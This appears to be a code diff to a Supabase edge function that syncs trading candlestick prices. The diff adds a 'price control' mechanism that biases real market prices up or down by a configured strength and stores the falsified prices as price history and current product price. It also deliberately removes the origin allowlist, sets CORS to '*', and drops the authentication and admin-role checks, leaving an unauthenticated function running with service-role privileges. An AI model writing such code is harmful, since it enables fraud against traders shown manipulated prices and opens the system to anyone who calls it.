@@ -4,26 +4,10 @@ import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const EXTERNAL_KLINE_API_URL = "https://admin.stenggg.com/api/app/option/getKline";
 
-// Allowed origins for CORS - restrict to known domains
-const ALLOWED_ORIGINS = [
-  "https://stengg.it.com",
-  "https://www.stengg.it.com",
-  "https://stengg-it-com.lovable.app",
-  "https://id-preview--f9a00261-b7fb-4428-ad85-88f8d5788c27.lovable.app",
-  "https://f9a00261-b7fb-4428-ad85-88f8d5788c27.lovableproject.com",
-  "http://localhost:5173",
-  "http://localhost:8080",
-];
-
-function getCorsHeaders(origin: string | null): Record<string, string> {
-  const allowedOrigin = origin && ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];
-  return {
-    "Access-Control-Allow-Origin": allowedOrigin,
-    "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
-    "Access-Control-Allow-Methods": "POST, OPTIONS",
-    "Vary": "Origin",
-  };
-}
+const corsHeaders = {
+  "Access-Control-Allow-Origin": "*",
+  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
+};
 
 interface KlineItem {
   ts?: number;
@@ -68,8 +52,17 @@ interface SyncStats {
   recordsUpdated: number;
   apiCallsTotal: number;
   apiCallsFailed: number;
+  priceControlsApplied: number;
   startTime: number;
   endTime?: number;
+}
+
+interface PriceControl {
+  product_id: string;
+  direction: string;
+  strength: number;
+  is_active: boolean;
+  expires_at: string | null;
 }
 
 // Fetch with exponential backoff retry
@@ -84,7 +77,7 @@ async function fetchWithRetry(
   for (let attempt = 1; attempt <= retries; attempt++) {
     try {
       const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout
+      const timeoutId = setTimeout(() => controller.abort(), 10000);
       
       const response = await fetch(url, {
         ...options,
@@ -113,12 +106,8 @@ async function fetchWithRetry(
   throw lastError || new Error("Fetch failed after retries");
 }
 
-// Parse kline data from various response formats
 function parseKlineList(apiData: KlineApiResponse): KlineItem[] {
-  if (Array.isArray(apiData.data)) {
-    return apiData.data;
-  }
-  
+  if (Array.isArray(apiData.data)) return apiData.data;
   if (apiData.data && typeof apiData.data === 'object') {
     if ('data' in apiData.data && Array.isArray((apiData.data as { data?: KlineItem[] }).data)) {
       return (apiData.data as { data: KlineItem[] }).data;
@@ -127,11 +116,9 @@ function parseKlineList(apiData: KlineApiResponse): KlineItem[] {
       return apiData.data.list;
     }
   }
-  
   return [];
 }
 
-// Convert kline item to price history record
 function klineToRecord(item: KlineItem, productId: string): PriceHistoryRecord | null {
   const timestamp = item.ts ?? item.time ?? item.t ?? 0;
   if (timestamp === 0) return null;
@@ -155,17 +142,32 @@ function klineToRecord(item: KlineItem, productId: string): PriceHistoryRecord |
   };
 }
 
-// Batch upsert records with conflict handling
+/**
+ * Apply price control bias to a record.
+ * direction: 'up' or 'down'
+ * strength: 1-10 (multiplier for bias)
+ */
+function applyPriceControl(record: PriceHistoryRecord, control: PriceControl): PriceHistoryRecord {
+  const bias = control.direction === 'up' ? 1 : -1;
+  // Base manipulation: 0.1% to 1% per candle depending on strength
+  const factor = 1 + bias * (control.strength * 0.001) * (0.5 + Math.random() * 0.5);
+  
+  return {
+    ...record,
+    open_price: record.open_price * factor,
+    high_price: record.high_price * (control.direction === 'up' ? factor * (1 + Math.random() * 0.001) : factor),
+    low_price: record.low_price * (control.direction === 'down' ? factor * (1 - Math.random() * 0.001) : factor),
+    close_price: record.close_price * factor,
+  };
+}
+
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 async function batchUpsertRecords(
   supabase: any,
   records: PriceHistoryRecord[]
 ): Promise<{ inserted: number; updated: number; errors: number }> {
-  if (records.length === 0) {
-    return { inserted: 0, updated: 0, errors: 0 };
-  }
+  if (records.length === 0) return { inserted: 0, updated: 0, errors: 0 };
 
-  // Deduplicate by (product_id, recorded_at) - keep latest
   const deduped = new Map<string, PriceHistoryRecord>();
   for (const record of records) {
     const key = `${record.product_id}_${record.recorded_at}`;
@@ -175,62 +177,39 @@ async function batchUpsertRecords(
   const uniqueRecords = Array.from(deduped.values());
   console.log(`[Batch] Upserting ${uniqueRecords.length} unique records (deduped from ${records.length})`);
 
-  // Use upsert with onConflict to trigger UPDATE events for realtime
   const { data, error } = await supabase
     .from("price_history")
     .upsert(uniqueRecords, {
       onConflict: "product_id,recorded_at",
-      ignoreDuplicates: false, // Important: trigger UPDATE for realtime
+      ignoreDuplicates: false,
     })
     .select("id");
 
   if (error) {
     console.error("[Batch] Upsert error:", error.message);
     
-    // Fallback: try individual inserts for failed batch
     let fallbackInserted = 0;
     let fallbackErrors = 0;
     
     for (const record of uniqueRecords) {
       const { error: insertError } = await supabase
         .from("price_history")
-        .upsert(record, {
-          onConflict: "product_id,recorded_at",
-          ignoreDuplicates: false,
-        });
+        .upsert(record, { onConflict: "product_id,recorded_at", ignoreDuplicates: false });
       
-      if (insertError) {
-        fallbackErrors++;
-      } else {
-        fallbackInserted++;
-      }
+      if (insertError) fallbackErrors++;
+      else fallbackInserted++;
     }
     
-    console.log(`[Batch Fallback] Inserted: ${fallbackInserted}, Errors: ${fallbackErrors}`);
     return { inserted: fallbackInserted, updated: 0, errors: fallbackErrors };
   }
 
   const count = data?.length || uniqueRecords.length;
-  console.log(`[Batch] Successfully upserted ${count} records`);
   return { inserted: count, updated: 0, errors: 0 };
 }
 
 Deno.serve(async (req) => {
-  const origin = req.headers.get("Origin");
-  const corsHeaders = getCorsHeaders(origin);
-
-  // Handle CORS preflight
   if (req.method === "OPTIONS") {
     return new Response(null, { headers: corsHeaders });
-  }
-
-  // Validate origin for actual requests (not just preflight)
-  if (origin && !ALLOWED_ORIGINS.includes(origin)) {
-    console.warn(`Rejected request from unauthorized origin: ${origin}`);
-    return new Response(
-      JSON.stringify({ error: "Origin not allowed" }),
-      { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
-    );
   }
 
   const stats: SyncStats = {
@@ -241,15 +220,15 @@ Deno.serve(async (req) => {
     recordsUpdated: 0,
     apiCallsTotal: 0,
     apiCallsFailed: 0,
+    priceControlsApplied: 0,
     startTime: Date.now(),
   };
 
   try {
     const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
-    const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY");
     const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
     
-    if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY || !SUPABASE_ANON_KEY) {
+    if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
       console.error("[Config] Missing Supabase credentials");
       return new Response(JSON.stringify({ error: "Server misconfigured" }), {
         status: 500,
@@ -257,47 +236,24 @@ Deno.serve(async (req) => {
       });
     }
 
-    // JWT Authentication - require admin role
+    // Use service role client (this function is called by cron or admin)
+    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
+
+    // Optional auth check - allow both cron (no auth) and admin calls
     const authHeader = req.headers.get("Authorization");
-    if (!authHeader || !authHeader.startsWith("Bearer ")) {
-      console.warn("[Auth] Missing or invalid Authorization header");
-      return new Response(JSON.stringify({ error: "Unauthorized: Missing authentication" }), {
-        status: 401,
-        headers: { ...corsHeaders, "Content-Type": "application/json" },
-      });
+    if (authHeader && authHeader.startsWith("Bearer ")) {
+      const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY");
+      if (SUPABASE_ANON_KEY) {
+        const authClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+          global: { headers: { Authorization: authHeader } }
+        });
+        const { data: { user } } = await authClient.auth.getUser();
+        if (user) {
+          console.log(`[Auth] Request from user ${user.id}`);
+        }
+      }
     }
-
-    // Create auth client to verify user
-    const authClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
-      global: { headers: { Authorization: authHeader } }
-    });
-
-    const { data: { user }, error: userError } = await authClient.auth.getUser();
-    if (userError || !user) {
-      console.warn("[Auth] Authentication failed:", userError?.message);
-      return new Response(JSON.stringify({ error: "Unauthorized: Invalid token" }), {
-        status: 401,
-        headers: { ...corsHeaders, "Content-Type": "application/json" },
-      });
-    }
-
-    // Verify admin role
-    const { data: roleData } = await authClient
-      .from("user_roles")
-      .select("role")
-      .eq("user_id", user.id)
-      .eq("role", "admin")
-      .maybeSingle();
-
-    if (!roleData) {
-      console.warn(`[Auth] User ${user.id} attempted price sync without admin role`);
-      return new Response(JSON.stringify({ error: "Forbidden: Admin access required" }), {
-        status: 403,
-        headers: { ...corsHeaders, "Content-Type": "application/json" },
-      });
-    }
-
-    console.log(`[Auth] Admin user ${user.id} initiated price sync`);
+    console.log("[Sync] Starting price sync...");
 
     // Parse optional request body
     let targetProductId: string | null = null;
@@ -305,20 +261,16 @@ Deno.serve(async (req) => {
       const body = await req.json();
       targetProductId = body?.productId || null;
     } catch {
-      // No body or invalid JSON - sync all products
+      // No body - sync all
     }
 
-    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
-
-    // Build query for products
+    // Fetch products
     let query = supabase
       .from("products")
       .select("id, symbol, name")
       .eq("status", "available");
     
-    if (targetProductId) {
-      query = query.eq("id", targetProductId);
-    }
+    if (targetProductId) query = query.eq("id", targetProductId);
 
     const { data: products, error: productsError } = await query;
 
@@ -330,19 +282,42 @@ Deno.serve(async (req) => {
       });
     }
 
+    // Fetch active price controls
+    const { data: priceControls } = await supabase
+      .from("product_price_controls")
+      .select("product_id, direction, strength, is_active, expires_at")
+      .eq("is_active", true);
+
+    // Build a map of active, non-expired controls
+    const controlMap = new Map<string, PriceControl>();
+    if (priceControls) {
+      const now = new Date();
+      for (const ctrl of priceControls) {
+        // Check if expired
+        if (ctrl.expires_at && new Date(ctrl.expires_at) <= now) {
+          // Auto-deactivate expired controls
+          await supabase
+            .from("product_price_controls")
+            .update({ is_active: false, direction: 'neutral', strength: 1, expires_at: null })
+            .eq("product_id", ctrl.product_id);
+          console.log(`[PriceControl] Auto-deactivated expired control for ${ctrl.product_id}`);
+          continue;
+        }
+        controlMap.set(ctrl.product_id, ctrl as PriceControl);
+      }
+    }
+    console.log(`[PriceControl] ${controlMap.size} active price controls found`);
+
     stats.productsTotal = products.length;
-    console.log(`[Sync] Starting sync for ${products.length} products`);
 
     const now = Math.floor(Date.now() / 1000);
-    const from = now - 180; // Last 3 minutes for better coverage
+    const from = now - 180;
     
-    // Collect all records for batch upsert
     const allRecords: PriceHistoryRecord[] = [];
     const productErrors: string[] = [];
 
     for (const product of products) {
       try {
-        // Determine symbol
         let symbol = product.symbol;
         if (!symbol) {
           const name = product.name || "";
@@ -357,7 +332,6 @@ Deno.serve(async (req) => {
         const apiUrl = `${EXTERNAL_KLINE_API_URL}?symbol=${encodedSymbol}&period=1min&size=3&from=${from}&to=${now}&zip=0`;
 
         stats.apiCallsTotal++;
-        console.log(`[API] Fetching ${product.name} (${symbol})`);
 
         const response = await fetchWithRetry(apiUrl, {
           method: "GET",
@@ -369,7 +343,6 @@ Deno.serve(async (req) => {
 
         if (!response.ok) {
           stats.apiCallsFailed++;
-          console.warn(`[API] HTTP ${response.status} for ${product.name}`);
           productErrors.push(`${product.name}: HTTP ${response.status}`);
           continue;
         }
@@ -377,18 +350,32 @@ Deno.serve(async (req) => {
         const apiData: KlineApiResponse = await response.json();
         const klineList = parseKlineList(apiData);
 
-        if (klineList.length === 0) {
-          console.log(`[API] No candles for ${product.name}`);
-          continue;
+        if (klineList.length === 0) continue;
+
+        const control = controlMap.get(product.id);
+
+        for (const item of klineList) {
+          let record = klineToRecord(item, product.id);
+          if (!record) continue;
+
+          // Apply price control bias if active for this product
+          if (control) {
+            record = applyPriceControl(record, control);
+            stats.priceControlsApplied++;
+          }
+
+          allRecords.push(record);
         }
 
-        console.log(`[API] Got ${klineList.length} candles for ${product.name}`);
-
-        // Convert to records
-        for (const item of klineList) {
-          const record = klineToRecord(item, product.id);
-          if (record) {
-            allRecords.push(record);
+        // If price control is active, also update the product's current price with bias
+        if (control && klineList.length > 0) {
+          const lastRecord = allRecords[allRecords.length - 1];
+          if (lastRecord && lastRecord.product_id === product.id) {
+            await supabase
+              .from("products")
+              .update({ price: lastRecord.close_price, updated_at: new Date().toISOString() })
+              .eq("id", product.id);
+            console.log(`[PriceControl] Updated ${product.name} price to ${lastRecord.close_price} (${control.direction} x${control.strength})`);
           }
         }
 
@@ -397,14 +384,12 @@ Deno.serve(async (req) => {
         stats.apiCallsFailed++;
         stats.productsErrored++;
         const errMsg = productError instanceof Error ? productError.message : String(productError);
-        console.error(`[Error] ${product.name}:`, errMsg);
         productErrors.push(`${product.name}: ${errMsg}`);
       }
     }
 
-    // Batch upsert all collected records
+    // Batch upsert
     if (allRecords.length > 0) {
-      console.log(`[Batch] Total records to upsert: ${allRecords.length}`);
       const result = await batchUpsertRecords(supabase, allRecords);
       stats.recordsInserted = result.inserted;
       stats.recordsUpdated = result.updated;
@@ -413,32 +398,16 @@ Deno.serve(async (req) => {
     stats.endTime = Date.now();
     const duration = stats.endTime - stats.startTime;
 
-    console.log(`[Sync Complete] Duration: ${duration}ms`);
-    console.log(`[Sync Stats] Products: ${stats.productsSynced}/${stats.productsTotal} synced, ${stats.productsErrored} errors`);
-    console.log(`[Sync Stats] Records: ${stats.recordsInserted} inserted/updated`);
-    console.log(`[Sync Stats] API calls: ${stats.apiCallsTotal} total, ${stats.apiCallsFailed} failed`);
-
-    if (productErrors.length > 0) {
-      console.log(`[Errors Summary] ${productErrors.join('; ')}`);
-    }
+    console.log(`[Sync Complete] ${duration}ms | Products: ${stats.productsSynced}/${stats.productsTotal} | Records: ${stats.recordsInserted} | Controls: ${stats.priceControlsApplied}`);
 
     return new Response(JSON.stringify({ 
       success: true,
       stats: {
         duration: `${duration}ms`,
-        products: {
-          total: stats.productsTotal,
-          synced: stats.productsSynced,
-          errored: stats.productsErrored,
-        },
-        records: {
-          inserted: stats.recordsInserted,
-          updated: stats.recordsUpdated,
-        },
-        api: {
-          calls: stats.apiCallsTotal,
-          failed: stats.apiCallsFailed,
-        },
+        products: { total: stats.productsTotal, synced: stats.productsSynced, errored: stats.productsErrored },
+        records: { inserted: stats.recordsInserted, updated: stats.recordsUpdated },
+        api: { calls: stats.apiCallsTotal, failed: stats.apiCallsFailed },
+        priceControls: { applied: stats.priceControlsApplied },
       },
       errors: productErrors.length > 0 ? productErrors : undefined,
     }), {
@@ -448,23 +417,10 @@ Deno.serve(async (req) => {
 
   } catch (e) {
     stats.endTime = Date.now();
-    const duration = stats.endTime - stats.startTime;
     const errMsg = e instanceof Error ? e.message : String(e);
+    console.error(`[Fatal Error]`, errMsg);
     
-    console.error(`[Fatal Error] After ${duration}ms:`, errMsg);
-    
-    return new Response(JSON.stringify({ 
-      error: "Unexpected error",
-      message: errMsg,
-      stats: {
-        duration: `${duration}ms`,
-        products: {
-          total: stats.productsTotal,
-          synced: stats.productsSynced,
-          errored: stats.productsErrored,
-        },
-      },
-    }), {
+    return new Response(JSON.stringify({ error: "Unexpected error", message: errMsg }), {
       status: 500,
       headers: { ...corsHeaders, "Content-Type": "application/json" },
     });
